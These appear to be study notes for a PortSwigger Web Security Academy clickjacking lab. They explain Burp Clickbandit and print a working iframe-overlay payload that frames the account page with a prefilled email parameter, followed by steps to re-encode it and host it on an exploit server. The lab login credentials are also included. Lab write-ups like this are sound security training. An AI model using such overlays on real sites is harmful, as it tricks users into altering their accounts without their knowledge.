Pre-requisite --> [[Burp Clickbandit]]
## Clickbandit

   - Although you can manually create a clickjacking proof of concept as described above, this can be fairly tedious and time-consuming in practice. When you're testing for clickjacking in the wild, we recommend using Burp's [Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit) tool instead.
   - This lets you use your browser to perform the desired actions on the frameable page(a webpage that can be put inside another webpage), then creates an HTML file containing a suitable clickjacking overlay.
   - You can use this to generate an interactive proof of concept in a matter of seconds, without having to write a single line of HTML or CSS.

## Clickjacking with prefilled form input

   Some websites let you fill out forms and submit them with information from the web address (GET parameters) or require you to type something before submitting. In cases where the URL contains the form data, attackers can modify the URL to include their chosen values and place an invisible "submit" button on a fake site, just like the basic clickjacking example. This is a way to trick users into unknowingly submitting their information.

## Steps to solve lab - 
### Title - Clickjacking with form input data prefilled from a URL parameter

**Desc** - The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button. To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

**Creds** - wiener:peter


```jsx
<script>window.addEventListener("message", function(e){ var data, childFrame = document.getElementById("childFrame"); try { data = JSON.parse(e.data); } catch(e){ data = {}; } if(!data.clickbandit){ return false; } childFrame.style.width = data.docWidth+"px";childFrame.style.height = data.docHeight+"px";childFrame.style.left = data.left+"px";childFrame.style.top = data.top+"px";}, false);</script><iframe src="https://0a0a00ee03d1d557804ad5af0049007a.web-security-academy.net/my-account?email=carlos@gmail.com" scrolling="no" style="width:1519px;height:565px;position:absolute;left:-6px;top:-271px;border:0;" frameborder="0" id="childFrame" onload="parent.postMessage(JSON.stringify({clickbandit:1}),'*')"></iframe>
```

1. Log in to your account on the target website.
  ![[clickjacking2.png]]

2. From the [[Burp Clickbandit]], we are going to generate a pre-made ClickJacking script.

	1. Go to the top-level **Burp** menu and select **Burp Clickbandit**.
	  ![[clickjacking5.png]]

	2. Click **Copy Clickbandit to clipboard** to copy the Clickbandit script.
	  ![[clickjacking6.png]]
	  
	  3. In your browser, visit the web page that you want to test.
	   ![[clickjacking7.png]]
	   
	4. In your browser, open the developer console. This might be called **Developer tools** or **JavaScript console**.
	5. Paste the Clickbandit script into the developer console, and press enter.
	   ![[clickjacking8.png]]
	   
	6. The Clickbandit banner appears at the top of the browser window.
	  ![[clickjacking9.png]]
	  
	7. Click **Start** to load the website.
	8. Click around the site, mimicking the actions that a victim user might perform. This is recorded by Clickbandit.
	  ![[clickjacking10.png]]
	  
	9. Click **Finish** to complete your attack.
	  ![[clickjacking12.png]]
	  

3. Review your html exploit.
![[clickjacking11.png]]
As you can see above, you need to specify the required email that victim update it when victim click on "Click" button and from the lab description you already know that you can prepopulate the email using URL parameter

![[clickjacking14.png]]

**We need to change the base64 encode URL as the above URL to make the exploit work.**
![[clickjacking15.png]]

4. After decoding the base64 encoded html, we got something as shown below:
```jsx
<script>window.addEventListener("message", function(e){ var data, childFrame = document.getElementById("childFrame"); try { data = JSON.parse(e.data); } catch(e){ data = {}; } if(!data.clickbandit){ return false; } childFrame.style.width = data.docWidth+"px";childFrame.style.height = data.docHeight+"px";childFrame.style.left = data.left+"px";childFrame.style.top = data.top+"px";}, false);</script><iframe src="https://0a0a00ee03d1d557804ad5af0049007a.web-security-academy.net/my-account" scrolling="no" style="width:1519px;height:565px;position:absolute;left:-6px;top:-271px;border:0;" frameborder="0" id="childFrame" onload="parent.postMessage(JSON.stringify({clickbandit:1}),'*')"></iframe>
```
We need to add "?email=carlos@gmail.com" at the end of URL like "https://0a0a00ee03d1d557804ad5af0049007a.web-security-academy.net/my-account?email=carlos@gmail.com" and again encode it with burp decoder and paste in the above place.

5. base64 encoding the modified exploit.
![[clickjacking16.png]]
paste this again in the required place.

6. Copy the modified exploit and paste in the exploit server.
![[clickjacking17.png]]

7. View the modified exploit and you are able to see that email is pre-filled without any user interaction.
![[clickjacking18.png]]

